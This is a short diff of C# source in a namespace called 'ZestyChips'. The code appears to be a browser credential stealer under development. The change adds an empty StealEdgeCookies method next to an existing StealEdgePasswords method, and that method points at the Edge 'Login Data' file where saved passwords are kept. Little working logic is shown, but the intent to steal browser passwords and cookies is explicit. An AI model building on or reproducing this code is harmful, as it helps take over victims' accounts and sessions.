@@ -37,13 +37,17 @@ namespace ZestyChips
         */
         private static void Edge() {
             StealEdgePasswords();
+            StealEdgeCookies();
+        }
+
+        private static void StealEdgeCookies() {
+
         }
         
         /*
         * Steals edge data
         */
         private static void StealEdgePasswords() {
-            string result = string.Empty;
             string loginDataLoc = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
             string edgeFinalData = string.Empty;
 
